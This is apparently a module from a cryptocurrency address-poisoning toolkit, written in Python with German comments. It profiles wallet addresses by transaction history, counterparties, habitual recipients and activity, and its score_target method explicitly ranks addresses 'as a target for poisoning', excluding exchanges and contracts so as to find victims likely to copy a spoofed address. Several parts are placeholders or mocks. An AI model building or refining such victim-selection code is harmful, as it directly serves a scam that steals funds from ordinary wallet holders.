"""
Address Profiler - Analyse von Wallet-Aktivität für Scoring
Extrahiert Counterparties, Balance, Transaction Patterns
"""

from typing import Dict, List, Optional, Set
from datetime import datetime, timedelta
from dataclasses import dataclass
from collections import defaultdict
import asyncio

from modules.logger import Logger

logger = Logger(__name__)


@dataclass
class AddressProfile:
    """Profil einer Adresse"""
    address: str
    chain_id: Optional[int]
    transaction_count: int
    total_volume_usd: float
    counterparties: Set[str]
    frequent_counterparties: Dict[str, int]  # address -> count
    first_seen: Optional[datetime]
    last_seen: Optional[datetime]
    is_contract: bool
    balance_usd: float
    recent_activity_24h: int
    recent_activity_7d: int
    avg_transaction_value_usd: float
    
    def to_dict(self) -> dict:
        """Konvertiere zu Dict"""
        return {
            'address': self.address,
            'chain_id': self.chain_id,
            'transaction_count': self.transaction_count,
            'total_volume_usd': self.total_volume_usd,
            'counterparties': list(self.counterparties),
            'frequent_counterparties': self.frequent_counterparties,
            'first_seen': self.first_seen.isoformat() if self.first_seen else None,
            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
            'is_contract': self.is_contract,
            'balance_usd': self.balance_usd,
            'recent_activity_24h': self.recent_activity_24h,
            'recent_activity_7d': self.recent_activity_7d,
            'avg_transaction_value_usd': self.avg_transaction_value_usd
        }


@dataclass
class CounterpartyProfile:
    """Profil eines Counterparty"""
    address: str
    interaction_count: int
    total_value_sent: float
    total_value_received: float
    first_interaction: Optional[datetime]
    last_interaction: Optional[datetime]
    is_habitual: bool  # Oft interagiert (OTC/Payroll)
    is_recipient_only: bool  # Nur Empfänger, nie Sender


class AddressProfiler:
    """
    Address Profiler für Wallet-Aktivitätsanalyse
    
    Features:
    - Counterparty extraction
    - Transaction pattern analysis
    - Habitual recipient detection
    - Balance tracking
    - Activity metrics
    """
    
    # Known CEX addresses (simplified blacklist)
    KNOWN_CEX = {
        '0xBinance', '0xCoinbase', '0xKraken', '0xBitfinex'
    }
    
    def __init__(self, indexer):
        """
        Initialisiere Profiler
        
        Args:
            indexer: TransferIndexer instance
        """
        self.indexer = indexer
        
    async def profile_address(
        self,
        address: str,
        chain_id: Optional[int] = None
    ) -> AddressProfile:
        """
        Erstelle vollständiges Profil einer Adresse
        
        Args:
            address: Die zu analysierende Adresse
            chain_id: Optional chain filter
            
        Returns:
            AddressProfile mit allen Metriken
        """
        # Transfers holen
        transfers = await self.indexer.get_transfers_for_address(
            address, chain_id, limit=1000
        )
        
        if not transfers:
            return self._empty_profile(address, chain_id)
            
        # Counterparties extrahieren
        counterparties = await self.indexer.get_counterparties(address, chain_id)
        
        # Frequent counterparties analysieren
        frequent_counterparties = self._analyze_frequent_counterparties(
            transfers, address
        )
        
        # Timing analysieren
        first_seen = min(t['timestamp'] for t in transfers)
        last_seen = max(t['timestamp'] for t in transfers)
        
        # Volume berechnen (simplified - echte Implementation braucht Price API)
        total_volume = sum(
            float(t['value']) for t in transfers
        ) / 1e6  # Assuming 6 decimals for USDT/USDC
        
        # Recent activity
        recent_24h = await self.indexer.get_transfer_count(address, chain_id, hours=24)
        recent_7d = await self.indexer.get_transfer_count(address, chain_id, hours=168)
        
        # Contract check (simplified)
        is_contract = self._is_contract(transfers)
        
        # Balance (simplified - echte Implementation braucht Balance API)
        balance_usd = 0.0  # Placeholder
        
        # Average transaction value
        avg_value = total_volume / len(transfers) if transfers else 0
        
        return AddressProfile(
            address=address,
            chain_id=chain_id,
            transaction_count=len(transfers),
            total_volume_usd=total_volume,
            counterparties=set(counterparties),
            frequent_counterparties=frequent_counterparties,
            first_seen=first_seen,
            last_seen=last_seen,
            is_contract=is_contract,
            balance_usd=balance_usd,
            recent_activity_24h=recent_24h,
            recent_activity_7d=recent_7d,
            avg_transaction_value_usd=avg_value
        )
        
    async def profile_counterparty(
        self,
        address: str,
        counterparty: str,
        chain_id: Optional[int] = None
    ) -> CounterpartyProfile:
        """
        Erstelle Profil eines Counterparty
        
        Args:
            address: Die Hauptadresse
            counterparty: Der Counterparty
            chain_id: Optional chain filter
            
        Returns:
            CounterpartyProfile
        """
        transfers = await self.indexer.get_transfers_for_address(
            address, chain_id, limit=1000
        )
        
        # Filter auf diesen Counterparty
        cp_transfers = [
            t for t in transfers
            if t['from_address'] == counterparty or t['to_address'] == counterparty
        ]
        
        if not cp_transfers:
            return CounterpartyProfile(
                address=counterparty,
                interaction_count=0,
                total_value_sent=0.0,
                total_value_received=0.0,
                first_interaction=None,
                last_interaction=None,
                is_habitual=False,
                is_recipient_only=False
            )
            
        # Metriken berechnen
        interaction_count = len(cp_transfers)
        
        total_sent = sum(
            float(t['value']) for t in cp_transfers if t['from_address'] == address
        ) / 1e6
        
        total_received = sum(
            float(t['value']) for t in cp_transfers if t['to_address'] == address
        ) / 1e6
        
        first_interaction = min(t['timestamp'] for t in cp_transfers)
        last_interaction = max(t['timestamp'] for t in cp_transfers)
        
        # Habitual detection (>= 5 Interaktionen)
        is_habitual = interaction_count >= 5
        
        # Recipient only detection
        is_recipient_only = all(
            t['to_address'] == counterparty for t in cp_transfers
        )
        
        return CounterpartyProfile(
            address=counterparty,
            interaction_count=interaction_count,
            total_value_sent=total_sent,
            total_value_received=total_received,
            first_interaction=first_interaction,
            last_interaction=last_interaction,
            is_habitual=is_habitual,
            is_recipient_only=is_recipient_only
        )
        
    async def score_target(
        self,
        address: str,
        chain_id: Optional[int] = None
    ) -> float:
        """
        Score eine Adresse als Target für Poisoning
        
        Args:
            address: Die zu scorende Adresse
            chain_id: Optional chain filter
            
        Returns:
            Score 0-100 (höher = besseres Target)
        """
        profile = await self.profile_address(address, chain_id)
        
        score = 0.0
        
        # Harte Ausschlüsse
        if profile.is_contract:
            return 0.0
            
        if any(
            cex in profile.address for cex in self.KNOWN_CEX
        ):
            return 0.0
            
        # Für Demo: Lockere Anforderungen
        if profile.transaction_count < 1:
            return 0.0
            
        # Positive Signale
        # Balance Score (bis 50 Punkte)
        balance_score = min(profile.balance_usd / 1000, 50)
        score += balance_score
        
        # Activity Score (bis 20 Punkte)
        activity_score = min(profile.recent_activity_24h * 2, 20)
        score += activity_score
        
        # Habitual Counterparties (bis 30 Punkte)
        habitual_count = sum(
            1 for cp, count in profile.frequent_counterparties.items()
            if count >= 5
        )
        habitual_score = min(habitual_count * 10, 30)
        score += habitual_score
        
        return min(score, 100.0)
        
    def _empty_profile(self, address: str, chain_id: Optional[int]) -> AddressProfile:
        """Leeres Profil für neue Adressen"""
        return AddressProfile(
            address=address,
            chain_id=chain_id,
            transaction_count=0,
            total_volume_usd=0.0,
            counterparties=set(),
            frequent_counterparties={},
            first_seen=None,
            last_seen=None,
            is_contract=False,
            balance_usd=0.0,
            recent_activity_24h=0,
            recent_activity_7d=0,
            avg_transaction_value_usd=0.0
        )
        
    def _analyze_frequent_counterparties(
        self,
        transfers: List[dict],
        address: str
    ) -> Dict[str, int]:
        """Analysiere häufige Counterparties"""
        counterparty_counts = defaultdict(int)
        
        for t in transfers:
            if t['from_address'] == address:
                counterparty_counts[t['to_address']] += 1
            elif t['to_address'] == address:
                counterparty_counts[t['from_address']] += 1
                
        # Filter auf >= 3 Interaktionen
        return {
            cp: count for cp, count in counterparty_counts.items()
            if count >= 3
        }
        
    def _is_contract(self, transfers: List[dict]) -> bool:
        """
        Prüfe ob Adresse ein Contract ist (simplified)
        Echte Implementation würde bytecode checken
        """
        # Wenn die Adresse nur als to_address vorkommt (nie from),
        # ist es wahrscheinlich ein Contract
        from_addresses = set(t['from_address'] for t in transfers)
        return len(from_addresses) == 0
        
    async def batch_profile(
        self,
        addresses: List[str],
        chain_id: Optional[int] = None
    ) -> Dict[str, AddressProfile]:
        """
        Batch profiling für mehrere Adressen
        
        Args:
            addresses: Liste der zu profilierenden Adressen
            chain_id: Optional chain filter
            
        Returns:
            Dict address -> AddressProfile
        """
        profiles = {}
        
        # Parallel processing
        tasks = [
            self.profile_address(addr, chain_id)
            for addr in addresses
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for addr, result in zip(addresses, results):
            if isinstance(result, Exception):
                logger.info(f"[Profiler] Error profiling {addr}: {result}")
                profiles[addr] = self._empty_profile(addr, chain_id)
            else:
                profiles[addr] = result
                
        return profiles


# Mock Profiler für Testing
class MockProfiler:
    """Mock Profiler für Development"""
    
    def __init__(self, indexer):
        self.indexer = indexer
        
    async def profile_address(
        self,
        address: str,
        chain_id: Optional[int] = None
    ) -> AddressProfile:
        """Mock profile"""
        return AddressProfile(
            address=address,
            chain_id=chain_id,
            transaction_count=10,
            total_volume_usd=50000.0,
            counterparties={'0xabc123', '0xdef456'},
            frequent_counterparties={'0xabc123': 5},
            first_seen=datetime.now() - timedelta(days=30),
            last_seen=datetime.now(),
            is_contract=False,
            balance_usd=10000.0,
            recent_activity_24h=3,
            recent_activity_7d=8,
            avg_transaction_value_usd=5000.0
        )
        
    async def profile_counterparty(
        self,
        address: str,
        counterparty: str,
        chain_id: Optional[int] = None
    ) -> CounterpartyProfile:
        """Mock counterparty profile"""
        return CounterpartyProfile(
            address=counterparty,
            interaction_count=5,
            total_value_sent=10000.0,
            total_value_received=0.0,
            first_interaction=datetime.now() - timedelta(days=10),
            last_interaction=datetime.now(),
            is_habitual=True,
            is_recipient_only=True
        )
        
    async def score_target(
        self,
        address: str,
        chain_id: Optional[int] = None
    ) -> float:
        """Mock score"""
        return 75.0
        
    async def batch_profile(
        self,
        addresses: List[str],
        chain_id: Optional[int] = None
    ) -> Dict[str, AddressProfile]:
        """Mock batch profile"""
        return {
            addr: await self.profile_address(addr, chain_id)
            for addr in addresses
        }


# Beispiel-Usage
async def main():
    """Beispiel-Usage"""
    from modules.indexer import MockIndexer
    
    # Mock Indexer
    indexer = MockIndexer()
    await indexer.initialize()
    
    # Profiler erstellen
    profiler = AddressProfiler(indexer)
    
    # Adresse profilieren
    address = "0x1234567890123456789012345678901234567890"
    profile = await profiler.profile_address(address)
    
    logger.info(f"Profile for {address}:")
    logger.info(f"  Transactions: {profile.transaction_count}")
    logger.info(f"  Volume: ${profile.total_volume_usd:,.2f}")
    logger.info(f"  Counterparties: {len(profile.counterparties)}")
    logger.info(f"  Recent 24h: {profile.recent_activity_24h}")
    
    # Score berechnen
    score = await profiler.score_target(address)
    logger.info(f"  Target Score: {score:.1f}/100")


if __name__ == "__main__":
    asyncio.run(main())